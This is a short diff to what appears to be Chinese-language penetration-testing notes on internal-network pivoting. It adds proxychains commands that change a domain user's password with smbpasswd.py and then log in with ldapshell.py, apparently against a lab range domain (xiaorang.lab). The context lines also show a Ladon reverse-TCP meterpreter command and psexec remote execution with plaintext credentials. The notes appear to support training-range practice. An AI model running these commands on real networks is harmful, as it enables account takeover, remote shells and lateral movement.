@@ -249,6 +249,8 @@ Ladon ReverseTcp 192.168.1.8 4444 meter
 
 只对tcp流量有效，所以udp和icmp都是不能代理转发的。 有ping之类的扫描工具要关掉
 
+proxychains4 -q -f proxychains.conf python3 ldapshell.py xiaorang.lab/Aldrich:111qqq...@172.22.8.15
+
 ## frp
 [神兵利器 | Frp搭建多层内网通信隧道总结（建议收藏）](https://mp.weixin.qq.com/s/mO378TD7Jp3R8x7e7EpOCg)
 [隧道？代理？端口转发？（一文读懂）](https://mp.weixin.qq.com/s/PDIWU-xej9SffRXlDEJYdA)
@@ -680,7 +682,10 @@ python psexec.py god/administrator:hongrisec@2019@192.168.52.143 ipconfig
 # 3.上传文件并执行
 python psexec.py god/administrator:hongrisec@2019@192.168.52.143 -c 1.bat 
 
-
+# 修改密码
+proxychains4 python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.15 -newpass 111qqq...
+# 登录测试
+proxychains4 -q -f proxychains.conf python3 ldapshell.py xiaorang.lab/Aldrich:111qqq...@172.22.8.15
 ```
 
 ## mstsc
